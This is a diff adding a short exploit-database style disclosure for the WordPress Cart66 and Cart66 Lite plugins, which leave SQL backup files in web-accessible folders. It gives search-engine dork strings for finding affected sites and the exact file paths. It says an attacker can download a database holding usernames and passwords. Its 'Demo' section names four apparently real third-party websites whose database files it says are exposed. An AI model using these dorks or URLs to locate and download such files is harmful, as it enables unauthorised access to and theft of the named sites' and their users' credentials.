@@ -1,0 +1,30 @@
+####################################
+# Exploit TItle: Wordpress Plugins Cart66 Lite & Cart66 DatabaseSQL Backup Disclosure Vulnerability
+# Date: 15 Juny 2019
+# Author Bug: L4663r666h05t x Indonesian Code Party
+# Dork: 
+
+        "Index of /wp-content/plugins/cart66-lite/sql"
+        "Index of /wp-content/plugins/cart66/sql"
+        
+# Vendor: https://cart66.com/
+####################################
+
+File: database.sql
+Location: 
+http://localhost/wp-content/plugins/cart66-lite/sql/database.sql
+http://localhost/wp-content/plugins/cart66/sql/database.sql
+------------------------------------------------------------------
+
+Impact:
+An Attacker can view or download a database, which contains the username and password.
+
+------------------------------------------------------------------
+Demo:
+http://powercore.net/wp-content/plugins/cart66/sql/database.sql
+https://dogtread.com/wp-content/plugins/cart66/sql/database.sql
+http://thehealersjournal.com/wp-content/plugins/cart66-lite/sql/database.sql
+http://oakridgebikeshop.com/wp-content/plugins/cart66-lite/sql/database.sql
+------------------------------------------------------------------
+
+IndonesianCode.Party~
